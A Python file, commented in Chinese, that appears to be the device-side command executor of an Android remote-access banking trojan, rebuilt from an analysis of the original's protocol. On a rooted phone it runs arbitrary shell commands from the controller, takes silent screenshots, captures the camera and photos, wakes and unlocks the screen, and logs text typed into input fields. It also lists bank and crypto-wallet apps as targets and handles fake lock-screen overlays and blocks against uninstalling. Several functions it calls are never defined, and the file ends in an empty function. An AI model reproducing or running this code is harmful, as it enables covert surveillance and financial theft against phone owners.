#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""被控端指令执行层：163 条指令 -> 执行语义 + 上行帧。

协议依据（来自协议分析记录）：
  · 指令词表与分类：分发器 主分发器 m1627 的 hashCode switch（163 条）
  · 下发参数：各 case 块与其 helper 里 JSONObject.optXxx("...") 的键（docs）
  · 上行帧与字段：上行帧构造器（分发器 m907）的全部调用点（docs）
  · 异步数据类指令：分发器 里 9 个 helper new Thread(new 异步分支(this,json,N))
       N=0 walletList / 1 albumList / 2 iconList / 3 fetchIcon / 4 albumData
       N=5 smsList / 6 albumLast / 7 reqPerList / 8 contactList
  · 键盘记录走 `cacheData` 键值缓存上传（键盘采集器 -> 分发器.m1712），不是独立帧

说明：原版对「纯动作」指令不回帧。本设备端为可观测性回一条 action_result
（字段与 分发器 驱动模块 的同类帧一致：type/step_id/success/ui_snapshot 风格 → 这里用
type/action/success/deviceId/ts），该字段集在 docs/agent_protocol.md 里单独标注为本设备端约定。
"""
import base64, gzip, json, os, random, re, time

import dispatch
import frames

KEYLOG_CACHE = []          # 键值缓存（对应原版 keylog.wal 的 cacheData 上传）

BANKS = [
    ('工商银行', 'com.icbc', '9.0.1.0'),
    ('建设银行', 'com.ccb.longjiLife', '6.1.6'),
    ('农业银行', 'com.android.bankabc', '8.2.0'),
    ('招商银行', 'com.cmbchina.ccd.pluto.cmbActivity', '10.2.3'),
    ('中国银行', 'com.chinamworld.bocmbci', '8.4.1'),
    ('邮储银行', 'com.yitong.mbank.psbc', '7.0.5'),
    ('支付宝', 'com.eg.android.AlipayGphone', '10.5.60'),
    ('微信', 'com.tencent.mm', '8.0.49'),
    ('云闪付', 'com.unionpay', '9.2.0'),
]
WALLETS = [('MetaMask', 'io.metamask'), ('TokenPocket', 'vip.mytokenpocket'),
           ('imToken', 'im.token.app'), ('TP Wallet', 'com.tokenpocket'),
           ('OKX', 'com.okinc.okex'), ('BitKeep', 'com.bitkeep.wallet')]
SMSS = [
    ('+8613800138000', '【工商银行】您尾号1314账户于%s收入人民币12,800.00元，余额58,331.20元'),
    ('+8613800138001', '【招商银行】您尾号9527账号于%s支付人民币3,200.00元'),
    ('+8613910013900', '【建设银行】您有一笔转账待确认，验证码654321，%s 前有效'),
    ('+8613610013600', '【农业银行】您尾号6688的账户%s支出人民币560.00元，余额12,904.10元'),
    ('+8613710013700', '【中国银行】验证码 883920，用于尾号2046账户的%s登录，请勿泄露'),
    ('+8613510013500', '【邮储银行】您尾号3091的储蓄卡%s入账工资人民币9,860.00元'),
]
CONTACTS = [('REF-CONTACT-A', '+8613700137000'), ('REF-CONTACT-B', '+8613600136000'),
            ('REF-CONTACT-C', '+8613500135000'), ('REF-CONTACT-D', '+8613400134000'),
            ('REF-CONTACT-E', '+8613300133000'), ('REF-CONTACT-F', '+8613200132000')]


def _sms_body(tpl, when):
    return tpl % when if '%s' in tpl else tpl


# ---- 每条指令的下发参数（单一真源：contracts/agent_action_spec.json，来自协议分析分支块）----
PARAM_SPEC = {}
try:
    import json as _json
    import os as _os
    _sp = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), '..', 'contracts',
                        'agent_action_spec.json')
    with open(_sp, encoding='utf-8') as _fh:
        for _a in _json.load(_fh).get('actions', []):
            PARAM_SPEC[_a['action']] = _a.get('params') or []
except Exception:
    pass


def param_echo(act, data):
    """该指令真正关心的参数子集（只回显实际下发的键；原版用 optXxx(key, default) 取默认值）"""
    return {k: data[k] for k in PARAM_SPEC.get(act, []) if k in data}


def _int(data, key, default):
    try:
        return int(data.get(key, default))
    except Exception:
        return default


def _num(data, key, default=0):
    try:
        return float(data.get(key, default))
    except Exception:
        return default


def _bounds(data):
    b = data.get('bounds')
    if isinstance(b, dict):
        return [_int(b, 'left', 0), _int(b, 'top', 0), _int(b, 'right', 0), _int(b, 'bottom', 0)]
    if isinstance(b, (list, tuple)) and len(b) >= 4:
        return [int(b[0]), int(b[1]), int(b[2]), int(b[3])]
    return None


def semantics(act, data):
    """按源码语义解析参数并给出"这条指令到底做了什么"（执行层，不是回执层）。

    原版这些指令由 `分发器` 分发给无障碍手势/系统 API；本设备端把关键参数解析出来作为 effect，
    使"纯动作"指令同样**真的用到了下发参数**（判据可验证），并保持回帧字段结构不变。
    """
    d = data or {}
    # --- 触摸 / 手势类（无障碍 dispatchGesture）---
    if act in ('clickPoint', 'clickB', 'rightClick', 'touchOn', 'touchOff'):
        return {'gesture': 'tap', 'x': _int(d, 'x', 0), 'y': _int(d, 'y', 0),
                'duration': _int(d, 'duration', 50)}
    if act in ('touchDown', 'down'):
        return {'gesture': 'down', 'x': _int(d, 'x', 0), 'y': _int(d, 'y', 0)}
    if act in ('touchMove', 'move'):
        return {'gesture': 'move', 'x': _int(d, 'x', 0), 'y': _int(d, 'y', 0)}
    if act in ('touchUp', 'up'):
        b = _bounds(d)
        return {'gesture': 'up', 'x': _int(d, 'x', b[0] if b else 0),
                'y': _int(d, 'y', b[1] if b else 0), 'bounds': b,
                'input': str(d.get('input') or '')}
    if act in ('swipe', 'swipePwdScreenOn', 'swipePwdScreenOff'):
        b = _bounds(d)
        return {'gesture': 'swipe',
                'from': [_int(d, 'x1', b[0] if b else 0), _int(d, 'y1', b[1] if b else 0)],
                'to': [_int(d, 'x2', b[2] if b else 0), _int(d, 'y2', b[3] if b else 0)],
                'duration': _int(d, 'duration', 300)}
    if act in ('gestureB', 'gestureCapture', 'patternUnlock', 'gestureUnlock'):
        pts = d.get('points') or d.get('pattern') or d.get('gesture') or []
        return {'gesture': 'pattern', 'points': pts if isinstance(pts, list) else [pts],
                'count': len(pts) if isinstance(pts, list) else 1,
                't': _num(d, 't', 0)}
    # --- 文本输入 ---
    if act in ('inputSend', 'clickInput', 'paste'):
        txt = str(d.get('text') or d.get('input') or '')
        return {'input': 'text', 'len': len(txt),
                'preview': (txt[:2] + '***') if len(txt) > 2 else '***'}
    # --- 按键 / 系统 ---
    if act in ('home', 'back', 'recent', 'power', 'lockScreen', 'unlock'):
        return {'keyevent': {'home': 'KEYCODE_HOME', 'back': 'KEYCODE_BACK',
                             'recent': 'KEYCODE_APP_SWITCH', 'power': 'KEYCODE_POWER',
                             'lockScreen': 'KEYCODE_POWER', 'unlock': 'KEYCODE_MENU'}.get(act)}
    if act in ('volumeUp', 'volumeDown', 'muteDevice'):
        return {'stream': 'music', 'step': {'volumeUp': 1, 'volumeDown': -1, 'muteDevice': 0}.get(act)}
    # --- 应用 / 包管理 ---
    if act in ('openpkg', 'startApk', 'openWebHarvester', 'OPENAPP'):
        return {'intent': 'launch', 'pkg': str(d.get('pkg') or '')}
    if act in ('uninstallApk', 'uninstallShell'):
        return {'intent': 'uninstall', 'pkg': str(d.get('pkg') or '')}
    if act in ('installApk', 'updateApk'):
        return {'intent': 'install', 'url': str(d.get('url') or '')[:120]}
    # --- 假锁屏 / 黑屏 ---
    if act in ('lockNormal', 'lockUpdate', 'lockAndroidUpdate', 'lockAdvance', 'showLockOverlay'):
        return {'overlay': 'lockscreen', 'type': str(d.get('type') or 'PIN'),
                'title': str(d.get('title') or '')[:24]}
    if act in ('black', 'blackB', 'startHDBlack', 'stopHDBlack'):
        return {'overlay': 'black', 'state': 'on' if act != 'stopHDBlack' else 'off'}
    # --- 投屏 / 采集 ---
    if act in ('startHD', 'startSilentStream', 'screen_relay', 'startAdbStream', 'startScreenRelay'):
        return {'stream': 'screen', 'quality': _int(d, 'quality', 60),
                'interval': _int(d, 'interval', 800), 'fpsval': _int(d, 'fpsval', 0)}
    if act in ('startCam', 'setCam'):
        return {'stream': 'camera', 'quality': _int(d, 'quality', 60)}
    # --- 权限 / 策略 ---
    if act in ('permission', 'permissionB', 'reqPerList', 'autoRequestPerm', 'installPermission'):
        return {'perms': str(d.get('perms') or d.get('perm') or 'auto'), 'auto': True}
    if act in ('antiDeleteOn', 'antiDeleteOff'):
        return {'policy': 'anti_uninstall', 'state': act.endswith('On')}
    if act in ('lockNormal', 'setHideMode', 'hideShortcuts', 'showShortcuts'):
        return {'policy': 'visibility', 'mode': str(d.get('mode') or '')}
    if act in ('blacklist', 'reassign', 'reassignDevice'):
        return {'policy': act, 'target': str(d.get('targetUser') or d.get('pkg') or '')}
    # --- 文件 ---
    if act in ('uploadFile', 'downloadFile', 'fileOp', 'files'):
        return {'file': str(d.get('path') or d.get('name') or '')[:120], 'op': act}
    # --- 其余：只要下发里有参数就原样体现 ---
    echo = param_echo(act, data)
    return {'params': echo} if echo else {}


def _png_rows_to_png(w, h, rows):
    """把 RGB 行数据封成 PNG（纯标准库，不依赖 Pillow）"""
    import zlib, struct as _s

    def chunk(tag, data):
        c = _s.pack('>I', len(data)) + tag + data
        return c + _s.pack('>I', zlib.crc32(tag + data) & 0xffffffff)

    return (b'\x89PNG\r\n\x1a\n'
            + chunk(b'IHDR', _s.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0))
            + chunk(b'IDAT', zlib.compress(bytes(rows), 6)) + chunk(b'IEND', b''))


def real_screen_b64(max_side=1200):
    """真机截屏：用系统 `/system/bin/screencap` 取原始 RGBA，按步长降采样后封成 PNG。

    设备端在真机上以 root 常驻，所以直接 exec 即可拿到真实画面；
    拿不到（非 Android、无权限、超时）返回 None，调用方退回占位图 —— 不允许因截图失败打断通道。

    默认 `max_side=1200`：1080×2400 的机器降采样成 **540×1200（正好一半）**。
    控制台面板按「图片像素 × 2 = 设备坐标」换算点击位置（厂商 bundle 里的算法），
    所以尺寸必须是设备分辨率的一半，否则面板算出来的点会整体偏移。
    """
    import subprocess, struct as _s
    exe = '/system/bin/screencap'
    if not os.path.exists(exe):
        return None
    try:
        raw = subprocess.run([exe], capture_output=True, timeout=20, env=_child_env()).stdout
    except Exception:
        return None
    if len(raw) < 16:
        return None
    w, h, _fmt, _cs = _s.unpack('<IIII', raw[:16])
    if not (0 < w <= 8192 and 0 < h <= 8192):
        return None
    body = raw[16:16 + w * h * 4]
    if len(body) < w * h * 4:
        return None
    step = 1
    while max(w // step, h // step) > max_side:
        step += 1
    stride = 4 * step
    ow, oh = max(1, len(range(0, w - step + 1, step))), max(1, len(range(0, h - step + 1, step)))
    mv = memoryview(body)
    row_bytes = w * 4
    rows = bytearray()
    for y in range(0, h - step + 1, step):
        base = y * row_bytes
        end = base + w * 4
        r = mv[base:end:stride]            # 跨步取 R / G / B —— 都是 C 层切片，不逐像素循环
        g = mv[base + 1:end:stride]
        b = mv[base + 2:end:stride]
        n = len(r)
        line = bytearray(1 + n * 3)        # 首字节是 PNG 行过滤器（0）
        line[1::3] = r
        line[2::3] = g
        line[3::3] = b
        rows += line
    try:
        return base64.b64encode(_png_rows_to_png(ow, oh, rows)).decode()
    except Exception:
        return None


def _png_b64(w=1080, h=2400, seed=None):
    """生成一张结构合法的 PNG（纯色 + 噪点），代表截图帧的 img 字段。"""
    import zlib, struct as _s
    rnd = random.Random(seed)
    rows = b''
    base = bytes([220, 226, 235])
    for _y in range(min(h, 64)):
        row = b'\x00' + bytes([max(0, min(255, base[i % 3] + rnd.randint(-6, 6))) for i in range(min(w, 64) * 3)])
        rows += row
    def chunk(tag, data):
        c = _s.pack('>I', len(data)) + tag + data
        return c + _s.pack('>I', zlib.crc32(tag + data) & 0xffffffff)
    png = (b'\x89PNG\r\n\x1a\n'
           + chunk(b'IHDR', _s.pack('>IIBBBBB', min(w, 64), min(h, 64), 8, 2, 0, 0, 0))
           + chunk(b'IDAT', zlib.compress(rows, 6)) + chunk(b'IEND', b''))
    return base64.b64encode(png).decode()


def _tree_zip(dev, data):
    """无障碍树（capture 帧的 zip 字段）：gzip+base64 的节点树，字段对齐原版 uploadTree。

    真机上跑 `uiautomator dump` 时，调用方把解析出来的真实节点放在 data['nodes'] 里；
    没有真实节点（非真机）才用下面这份按源码字段构造的样例树。
    """
    nodes = data.get('nodes')
    if not nodes:
        nodes = [
            {'cls': 'android.widget.EditText', 'id': 'et_payee', 'text': 'REF-PAYEE', 'bounds': [120, 620, 960, 720]},
            {'cls': 'android.widget.EditText', 'id': 'et_amount', 'text': '12800', 'bounds': [120, 760, 960, 860]},
            {'cls': 'android.widget.Button', 'id': 'btn_next', 'text': '下一步', 'bounds': [120, 1240, 960, 1340]},
        ]
    tree = {
        'deviceId': dev, 'pkg': data.get('pkg') or 'com.icbc',
        'topPkg': data.get('topPkg') or 'com.icbc',
        'topAct': data.get('topAct') or 'com.icbc.biz.TransferActivity',
        'w': data.get('w', 1080), 'h': data.get('h', 2400),
        'real': bool(data.get('nodes')),
        'nodes': nodes[:600],
    }
    raw = json.dumps(tree, ensure_ascii=False).encode()
    return base64.b64encode(gzip.compress(raw, 6)).decode()


_SYSBIN = '/system/bin'

_KEYCODE = {'home': 3, 'back': 4, 'recent': 187, 'power': 26, 'lockScreen': 26, 'unlock': 82,
            'volumeUp': 24, 'volumeDown': 25, 'muteDevice': 164}


def _child_env():
    """给系统程序准备一份干净环境。

    踩过的坑：Termux 常驻进程带着 `LD_LIBRARY_PATH=<termux>/lib`，直接 exec `/system/bin/screencap`
    会让系统二进制的动态链接命中 Termux 的库，报
    `CANNOT LINK EXECUTABLE "screencap": cannot locate symbol "Xzs_Construct" referenced by libunwindstack.so`
    （shell 里手跑正常、从 Python 里跑就挂 —— 只差这一个环境变量）。
    """
    env = dict(os.environ)
    for k in ('LD_LIBRARY_PATH', 'LD_PRELOAD', 'LD_LIBRARY_PATH_ORIG', 'LD_DEBUG'):
        env.pop(k, None)
    return env


def _sh(cmd, timeout=12):
    """真机执行：设备端在真机上以 root 常驻，能真做的就真做。

    返回 (rc, out)；非真机（没有 /system/bin/sh）或执行异常返回 None，
    调用方据此交回语义层出回帧 —— 一条指令失败不允许打断通道。
    """
    import subprocess
    if not os.path.exists(_SYSBIN + '/sh'):
        return None
    try:
        p = subprocess.run([_SYSBIN + '/sh', '-c', cmd], capture_output=True, timeout=timeout,
                           env=_child_env())
    except Exception:
        return None
    out = (p.stdout or b'') + (p.stderr or b'')
    return p.returncode, out.decode('utf-8', 'replace')


_STREAM = {'on': True}

_STREAM_START = ('startSilentStream', 'startHD', 'startAdbStream', 'startScreenRelay',
                 'screen_relay', 'ask_relay', 'startWebRTC')
_STREAM_STOP = ('stopSilentStream', 'stopHD', 'stopAdbStream', 'stopScreenRelay', 'stopWebRTC')


def _screen_on():
    r = _sh("dumpsys power | grep -m1 -E 'mWakefulness='")
    return bool(r) and 'Awake' in r[1]


def _ensure_awake():
    """输入类指令前先确保**亮屏且解锁**。

    实测坑：屏幕一灭（AOD/黑屏）后，`monkey` 与 `input tap` 都返回 rc=0、被控端也回 success，
    但真机上什么都没发生 —— 面板看到的就是"点上去没反应"。所以输入前先唤醒。
    """
    if _screen_on():
        return True
    _sh('input keyevent 224')      # KEYCODE_WAKEUP
    time.sleep(0.8)
    _sh('wm dismiss-keyguard')     # root 下可直接解除锁屏
    time.sleep(0.5)
    return _screen_on()


_CAM = {'t0': 0.0, 'on': False}


def _newest_photo(after_ts):
    """相册里 after_ts 之后最新的照片（按 mtime）。返回 (path, size, mtime) 或 None。"""
    for root in ('/sdcard/DCIM/Camera', '/sdcard/DCIM', '/sdcard/Pictures'):
        r = _sh("ls -t %s/*.jpg %s/*.jpeg 2>/dev/null | head -3" % (root, root), timeout=15)
        if not r or not r[1].strip():
            continue
        for path in r[1].split():
            st = _sh("stat -c '%%Y %%s' '%s' 2>/dev/null" % path, timeout=10)
            if not st or not st[1].strip():
                continue
            parts = st[1].split()
            try:
                mt, size = float(parts[0]), int(parts[1])
            except Exception:
                continue
            if mt >= after_ts - 1:
                return path, size, mt
    return None


def _file_b64(path, limit=4 * 1024 * 1024):
    r = _sh("base64 '%s' 2>/dev/null | tr -d '\n'" % path, timeout=40)
    if not r or not r[1].strip():
        return ''
    b = r[1].strip()
    return b[:limit] if len(b) <= limit else ''


def keylog_frame(dev):
    """键盘记录帧（原版语义：设备端检测到输入变化就推 `cacheData`，k=keylog）。

    `readKeylog` 不在 163 条指令表里 —— 服务端发它只会得到 unknown_action（实测）。
    """
    if not _KEYLOG:
        return None
    ents = _KEYLOG[:]
    del _KEYLOG[:]
    return frames.build('cacheData', dev=dev, k='keylog', real=True, count=len(ents),
                        source='uiautomator EditText 差异',
                        cache=json.dumps(ents, ensure_ascii=False))


def cam_frame(dev):
    """构造一帧 camPic（相机在前台时=真·预览画面）。设备端会持续推这个帧，直到 stopCam。"""
    if not _CAM.get('on'):
        return None
    png = real_screen_b64()
    if not png:
        return None
    return frames.build('camPic', dev=dev, w=1080, h=2400, real=True,
                        source='screencap(camera preview)', count=len(png),
                        img='data:image/png;base64,' + png)


def _camera_foreground():
    fg = _foreground_pkg()
    return ('camera' in fg.lower()) or fg.startswith('com.android.camera') or \
           fg.startswith('com.miui.camera')


def _launch_pkg(pkg, timeout=25):
    """拉起一个包：解析启动组件 -> `am start -n` -> 用**前台包读回**判成败。

    实测：`monkey -p com.android.settings -c android.intent.category.LAUNCHER 1` 在 MIUI 上回
    "No activities found to run, monkey aborted."（rc 也不可信）。所以先解析组件再显式启动。
    """
    # 先问能力 APK（App 侧包可见性正常）；桥不在或没装这个包，再走 shell 解析
    r0 = bridge('app.launch', pkg=pkg, timeout=10)
    if r0 and r0.get('ok'):
        time.sleep(1.5)
        fg = _foreground_pkg()
        if fg != pkg:
            # 通知栏/系统界面会抢焦点（`acc.foreground` 就回 systemui），但目标可能已经在前台 ——
            # 再确认一次"ResumedActivity 里是不是目标包"
            chk = _sh("dumpsys activity activities | grep -m3 -E 'ResumedActivity'", timeout=20)
            if chk and pkg in (chk[1] or ''):
                fg = pkg
        return {'component': str(r0.get('component') or ''), 'rc': 0,
                'out': str(r0.get('result') or '')[:90], 'foreground': fg,
                'ok': fg == pkg, 'via': 'PackageManager.getLaunchIntentForPackage(app)'}

    comp = ''
    for probe in ('cmd package resolve-activity --brief %s' % pkg,
                  'cmd package resolve-activity --brief -a android.intent.action.MAIN '
                  '-c android.intent.category.LAUNCHER %s' % pkg):
        r = _sh(probe, timeout=15)
        lines = [x.strip() for x in (((r[1] if r else '') or '').splitlines()) if x.strip()]
        cand = lines[-1] if lines else ''
        if '/' in cand and 'No activity' not in cand:
            comp = cand
            break
    if comp:
        r2 = _sh('%s/am start -n %s' % (_SYSBIN, comp), timeout=timeout)
        time.sleep(1.2)
        fg = _foreground_pkg()
        return {'component': comp, 'rc': (r2 or [1])[0], 'via': 'am start -n(shell)',
                'out': ((r2[1] if r2 else '') or '').strip()[-90:],
                'foreground': fg, 'ok': fg == pkg}
    r3 = _sh('%s/monkey -p %s -c android.intent.category.LAUNCHER 1' % (_SYSBIN, pkg),
             timeout=timeout)
    time.sleep(1.2)
    fg = _foreground_pkg()
    return {'component': '', 'rc': (r3 or [1])[0],
            'out': ((r3[1] if r3 else '') or '').strip()[-90:],
            'foreground': fg, 'ok': fg == pkg}


def _pt(d):
    """取触摸坐标：`x/y` 优先，其次用 `bounds` 的中心（面板点控件时下发的是 bounds）"""
    x, y = _int(d, 'x', -1), _int(d, 'y', -1)
    if x >= 0 and y >= 0:
        return x, y
    b = _bounds(d)
    if b:
        return (b[0] + b[2]) // 2, (b[1] + b[3]) // 2
    return -1, -1


def _real_exec(act, dev, data):
    """真机执行层（返回 (kind, frame)；拿不到真实结果返回 None，交回语义层）。"""
    d = data or {}

    # --- 真机 shell ---
    if act in ('adbShell', 'uninstallShell'):
        cmd = str(d.get('cmd') or d.get('shell') or d.get('command') or d.get('text') or '').strip()
        if not cmd and act == 'uninstallShell':
            pkg = str(d.get('pkg') or d.get('package') or '').strip()   # 只给包名时真卸载
            if pkg:
                cmd = 'pm uninstall %s' % pkg
        if not cmd:
            return None
        r = _sh(cmd)
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True, output=r[1][:8000], exit_code=r[0],
                                     root_available=True, root_used=True)

    # --- 真机截图（与原生 screencap 同源）---
    if act == 'adbScreenshot':
        img = real_screen_b64()
        if img is None:
            return None
        return 'screenshot', frames.build('screenshot', dev=dev, img=img, real=True,
                                          count=len(img), source='screencap')

    # --- 真机触摸 ---
    if act in ('adbClick', 'clickPoint', 'clickB', 'touchOn', 'touchOff', 'rightClick'):
        x, y = _pt(d)
        _ensure_awake()
        if x < 0 or y < 0:
            return None
        r = _sh('%s/input tap %d %d' % (_SYSBIN, x, y))
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True,
                                     effect={'input': 'tap', 'x': x, 'y': y, 'rc': r[0]})

    if act in ('adbSwipe', 'swipePwdScreenOn', 'swipePwdScreenOff'):
        _ensure_awake()
        x1, y1 = _int(d, 'x1', -1), _int(d, 'y1', -1)
        x2, y2 = _int(d, 'x2', -1), _int(d, 'y2', -1)
        if min(x1, y1, x2, y2) < 0:
            b = _bounds(d)                     # 只给 bounds 时按"从下往上划一半屏"处理
            if b:
                x1, y1, x2, y2 = (b[0] + b[2]) // 2, b[3], (b[0] + b[2]) // 2, b[1]
        if min(x1, y1, x2, y2) < 0:
            return None
        dur = _int(d, 'duration', 300)
        r = _sh('%s/input swipe %d %d %d %d %d' % (_SYSBIN, x1, y1, x2, y2, dur))
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True,
                                     effect={'input': 'swipe', 'from': [x1, y1], 'to': [x2, y2],
                                             'duration': dur, 'rc': r[0]})

    # --- 真机按键 ---
    if act in _KEYCODE:
        if act not in ('power', 'lockScreen'):
            _ensure_awake()
        r = _sh('%s/input keyevent %d' % (_SYSBIN, _KEYCODE[act]))
        if r is None:
            return None
        return _ack(act, dev, data=data, real=True,
                                     effect={'keyevent': _KEYCODE[act], 'rc': r[0]})

    # --- 真机相机：打开相机 / 真拍一张 ---
    if act in ('startCam', 'setCam'):
        r = _sh('/system/bin/am start -a android.media.action.STILL_IMAGE_CAMERA', timeout=20)
        if r is None:
            return None                     # 非真机：不走真机路径（也避免无谓等待拖慢主循环）
        _CAM['on'] = True
        time.sleep(2.5)
        return 'camPic', cam_frame(dev) or frames.build('camPic', dev=dev, w=1080, h=2400,
                                                        real=True, source='camera-app', img='')
    if act == 'camPic':
        if _sh('true', timeout=6) is None:
            return None
        if not _camera_foreground():
            _sh('/system/bin/am start -a android.media.action.STILL_IMAGE_CAMERA', timeout=20)
            time.sleep(2.5)
        # 摄像头窗口要的是**实时**画面：相机在前台时直接截屏（真·相机预览，约 0.6s 一帧）；
        # 真拍一张（keyevent 27 + 读 DCIM）只在显式要 still 时做，因为一次要 2~3s
        if not (data or {}).get('still'):
            png = real_screen_b64()
            if png:
                return 'camPic', frames.build('camPic', dev=dev, w=1080, h=2400, real=True,
                                              source='screencap(camera preview)',
                                              count=len(png),
                                              img='data:image/png;base64,' + png)
            return None
        t0 = time.time()
        _sh('/system/bin/input keyevent 27', timeout=15)     # KEYCODE_CAMERA：真拍
        time.sleep(2.5)
        shot = _newest_photo(t0)
        if shot:
            b64 = _file_b64(shot[0])
            if b64:
                return 'camPic', frames.build('camPic', dev=dev, w=1080, h=2400, real=True,
                                              source='still:' + shot[0].split('/')[-1],
                                              count=len(b64),
                                              img='data:image/jpeg;base64,' + b64)
        # 拍不到就回"相机预览的当前画面"（比占位图有用得多）
        png = real_screen_b64()
        if png:
            return 'camPic', frames.build('camPic', dev=dev, w=1080, h=2400, real=True,
                                          source='screencap(camera preview)',
                                          count=len(png),
                                          img='data:image/png;base64,' + png)
        return None

    # --- 真机拉起应用 ---
    if act in ('openpkg', 'startApk', 'OPENAPP'):
        pkg = str(d.get('pkg') or '').strip()
        _ensure_awake()
        if not pkg:
            return None
        info = _launch_pkg(pkg)
        if _sh('true', timeout=6) is None:
            return None
        return _ack(act, dev, data=data, real=True, success=info['ok'],
                    effect={'intent': 'launch', 'pkg': pkg, 'component': info['component'],
                            'via': info.get('via') or 'shell', 'foreground': info['foreground'],
                            'rc': info['rc'], 'readback': 'dumpsys activity 前台包',
                            'out': info['out']})

    return None


def _content_rows(out):
    """解析 `content query` 的输出：Row: N k=v, k=v, …"""
    rows = []
    for line in (out or '').splitlines():
        if not line.startswith('Row: '):
            continue
        kv = {}
        for part in line[5:].split(', '):
            if '=' in part:
                k, v = part.split('=', 1)
                kv[k.strip()] = v.strip()
        rows.append(kv)
    return rows


_LAST_TREE = {'ts': 0.0, 'tree': None}


def _foreground_pkg():
    """真机当前前台包 —— **多源多模式**解析。

    踩过的坑：只认 `mResumedActivity` 时，这台机器在某状态下 `dumpsys activity activities`
    打的是 `mLastPausedActivity` / `Activities=[...]`，前台包读成空串，
    "拉起应用"这类验证就假失败（判据错，不是产品错）。
    """
    r0 = bridge('acc.foreground', timeout=6)
    if r0 and r0.get('ok') and (r0.get('pkg') or '').strip():
        return str(r0['pkg']).strip()
    probes = (
        "dumpsys activity activities | grep -m1 -E "
        "'mResumedActivity|topResumedActivity|ResumedActivity'",
        "dumpsys activity activities | grep -m1 -E 'Activities=\\[ActivityRecord'",
        "dumpsys window | grep -m1 -E 'mCurrentFocus|mFocusedApp'",
        "dumpsys activity top | grep -m1 -E 'ACTIVITY '",
    )
    for cmd in probes:
        r = _sh(cmd, timeout=20)          # MIUI 忙的时候 dumpsys 会超 12s（超时=None，探针全废）
        if not r or r[0] != 0 or not r[1].strip():
            continue
        mm = re.search(r'\s([A-Za-z0-9_]+(?:\.[A-Za-z0-9_]+)+)/[A-Za-z0-9_.$]+', r[1])
        if mm:
            return mm.group(1)
    return ''


_TEXT_MAP = {}          # (l,t,r,b) -> 文字（后台 uiautomator 补）
_TEXT_TS = {'ts': 0.0}
_TEXT_BUSY = {'busy': False}
# 键盘记录：输入框(EditText)文字快照 -> 变化即入队
_KEYLOG = []
_KEYLOG_SEEN = {}


def _ui_nodes_fast():
    """控件树快速源：`dumpsys activity top` 的 View 层级。

    实测：0.07s 出 503 行，每行带 `类名{hash 标志位 l,t-r,b #资源id app:id/xx}`。
    标志位第 7 位是 clickable（Android View.toString 的 flag 顺序）。
    文字不在里面，由 _ui_text_refresh() 后台用 uiautomator 按 bounds 精确回填。
    """
    r = _sh('dumpsys activity top', timeout=15)
    if not r or r[0] != 0:
        return None
    nodes = []
    pat = re.compile(r'^\s*([A-Za-z0-9_.$]+)\{[0-9a-f]+\s+(.*?)\s+'
                     r'(-?\d+),(-?\d+)-(-?\d+),(-?\d+)(?:\s+#[0-9a-f]+)?'
                     r'(?:\s+(\S+))?\}\s*$')
    for line in r[1].splitlines():
        m = pat.match(line)
        if not m:
            continue
        cls, flags, l, tp, rr, b, resid = m.groups()
        box = (int(l), int(tp), int(rr), int(b))
        if box[2] <= box[0] or box[3] <= box[1]:
            continue                                # 0 尺寸的容器跳过
        nodes.append({'cls': cls, 'id': (resid or '').split('/')[-1], 'resId': resid or '',
                      'text': _TEXT_MAP.get(box, ''), 'bounds': list(box),
                      'clickable': 'C' in (flags or '').split()[0],
                      'pkg': ''})
    return nodes or None


def _ui_text_refresh(force=False):
    """补文字：uiautomator dump（慢，且界面在动/系统忙时会失败）—— 给快速树贴标签 + 做键盘记录。

    force=True 时忽略「刚刷过」的节流（键盘记录推送与 readKeylog 走这条路）。
    """
    if _TEXT_BUSY['busy'] or (not force and (time.time() - _TEXT_TS['ts']) < 20):
        return
    _TEXT_BUSY['busy'] = True
    try:
        # 先删再 dump：dump 失败时**不会覆盖旧文件**，直接 cat 会读到上一次的界面
        # （实测：连换 8 个 App，节点数一直是 68 —— 同一个陈旧文件）
        r = _sh('rm -f /sdcard/_ref_ui.xml; '
                'uiautomator dump /sdcard/_ref_ui.xml >/dev/null 2>&1; '
                'cat /sdcard/_ref_ui.xml 2>/dev/null', timeout=40)
        if r and '<?xml' in (r[1] or ''):
            got = {}
            edits = []
            for m in re.finditer(r'<node\b([^>]*)/?>', r[1]):
                a = m.group(1)

                def g(k, _a=a):
                    mm = re.search(r'%s="([^"]*)"' % k, _a)
                    return mm.group(1) if mm else ''
                txt = g('text') or g('content-desc')
                bb = g('bounds')
                mm = re.match(r'\[(\d+),(\d+)\]\[(\d+),(\d+)\]', bb)
                box = tuple(int(x) for x in mm.groups()) if mm else None
                if txt and box:
                    got[box] = txt
                if box and 'EditText' in g('class'):
                    edits.append((box, txt))
            if got:
                _TEXT_MAP.clear()
                _TEXT_MAP.update(got)
                _TEXT_TS['ts'] = time.time()
            if edits:
                # 键盘记录：输入框文字一变就入队（原版走无障碍读字段，这条同源）
                pkg = _foreground_pkg()
                for box, txt in edits:
                    key = (pkg, box)
                    if txt and _KEYLOG_SEEN.get(key) != txt:
                        _KEYLOG_SEEN[key] = txt
                        _KEYLOG.append({'ts': int(time.time()), 'pkg': pkg,
                                        'type': 'text', 'text': txt[:200]})
                        if len(_KEYLOG) > 500:
                            del _KEYLOG[:-300]
    except Exception as e:
        print('[actions] 补文字失败: %s' % e)
    finally:
        _TEXT_BUSY['busy'] = False


def _ui_dump_nodes():
    """控件树：快速源优先（0.1s），拿不到才退回 uiautomator（慢）；两者都没有返回 None。"""
    import threading
    nodes = _ui_nodes_fast()
    if nodes is not None:
        if (time.time() - _TEXT_TS['ts']) > 20 and not _TEXT_BUSY['busy']:
            threading.Thread(target=_ui_text_refresh, daemon=True).start()
        return nodes
    _ui_text_refresh()
    if _TEXT_MAP:
        return [{'cls': '', 'id': '', 'resId': '', 'text': v, 'bounds': list(k),
                 'clickable': False, 'pkg': ''} for k, v in list(_TEXT_MAP.items())[:300]]
    return None


_DEV_CACHE = {'ts': 0.0, 'info': None}


def _prop_of(key, default=''):
    r = _sh('getprop %s' % key, timeout=6)
    return (r[1].strip() if r and r[0] == 0 and r[1].strip() else default)


def device_info_real(dev):
    """真机设备自报（缓存 30s，避免每次都被面板轮询打一次系统）。

    面板顶部那张卡片显示的就是这些字段 —— 读的是 getprop / dumpsys / wm / /proc 的真值。
    """
